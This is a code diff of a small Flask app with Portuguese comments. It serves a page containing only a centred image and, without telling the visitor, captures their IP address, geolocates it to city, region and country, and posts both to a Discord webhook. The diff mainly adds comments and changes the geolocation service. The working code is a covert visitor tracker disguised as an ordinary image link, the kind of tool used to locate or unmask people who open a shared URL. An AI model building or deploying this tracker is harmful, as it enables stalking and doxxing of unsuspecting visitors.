@@ -1,41 +1,48 @@
 from flask import Flask, request, abort
 import requests, os
 
+# Cria a aplicação Flask
 app = Flask(__name__)
 
+# Pega as variáveis de ambiente configuradas no Render
 WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 
+# Função para buscar a localização do IP usando ip-api.com
 def get_location(ip):
     try:
-        response = requests.get(f"https://ipinfo.io/{ip}/json")
+        response = requests.get(f"http://ip-api.com/json/{ip}")
         if response.status_code == 200:
             data = response.json()
             cidade = data.get("city", "Desconhecida")
-            regiao = data.get("region", "Desconhecida")
+            regiao = data.get("regionName", "Desconhecida")
             pais = data.get("country", "Desconhecido")
             return f"{cidade}, {regiao}, {pais}"
     except:
         pass
     return "Localização não encontrada"
 
+# Rota principal do site
 @app.route('/')
 def home():
-    # Captura o IP real do visitante (não o 127.0.0.1 interno)
+    # Captura o IP real do visitante (via cabeçalho X-Forwarded-For)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+
+    # Verifica se o token passado na URL é válido
     token = request.args.get("token")
     if token != SECRET_TOKEN:
-        abort(403)
+        abort(403)  # Se não for válido, retorna erro 403 (acesso negado)
 
+    # Busca a localização do IP
     localizacao = get_location(ip)
 
-    # Envia notificação pro Discord
+    # Envia notificação para o Discord com IP e localização
     data = {
         "content": f"📢 Acesso autorizado!\nIP: {ip}\nLocalização: {localizacao}"
     }
     requests.post(WEBHOOK_URL, json=data)
 
-    # Página com somente a imagem centralizada
+    # Retorna a página HTML com a imagem centralizada
     return '''
         <html>
         <head>
@@ -62,6 +69,7 @@ def home():
         </html>
     '''
 
+# Inicia o servidor Flask
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000, debug=False)
 
